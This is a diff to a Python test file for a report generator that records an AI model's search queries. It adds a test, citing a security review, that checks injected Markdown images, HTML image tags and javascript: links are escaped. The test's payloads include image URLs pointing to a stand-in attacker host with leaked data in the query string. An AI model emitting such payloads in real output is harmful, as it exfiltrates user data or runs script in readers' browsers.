@@ -4,6 +4,7 @@ The real run is the owner's live check (O5), recorded in docs/TESTING.md.
 """
 
 import json
+import re
 from decimal import Decimal
 
 import httpx2
@@ -150,6 +151,30 @@ def test_chunks_found_by_keyword_only_are_marked(tmp_path):
         "**S2** #9 Made-up article 9 (2029) · Results · keyword only"
         in run_evaluation.report_text([run], run_evaluation.datetime(2026, 10, 21))
     )
+
+
+@pytest.mark.parametrize(
+    "query",
+    [
+        "![x](https://attacker.example/p?q=80kg)",
+        '<img src="https://attacker.example/p">',
+        "[click](javascript:alert(1))",
+    ],
+    ids=["image", "html image", "javascript link"],
+)
+def test_a_query_cannot_add_an_image_or_link_to_the_report(index, query):
+    """The model's query and rewrites are escaped Markdown in the report (security review, #46)."""
+    model = ScriptedChatModel(
+        replies=[tool_reply(("search_knowledge_base", {"query": query})), AIMessage(ANSWER)],
+        search_first=False,
+    )
+    translator = ScriptedTranslator(plans=[plan_json([query, f"{query} b", f"{query} c"])])
+    [run] = _evaluate([_item("q1", QUESTION)], index, model, translator)
+    report = run_evaluation.report_text([run], run_evaluation.datetime(2026, 10, 29))
+    [line] = [line for line in report.splitlines() if line.startswith("**Search 1:**")]
+    assert query not in line
+    # Every bracket is escaped, so no link, image or tag is read from the line.
+    assert re.search(r"(?<!\\)[\[\]<>]", line) is None
 
 
 def test_the_profile_reaches_the_tools_only_in_the_profile_run(index):
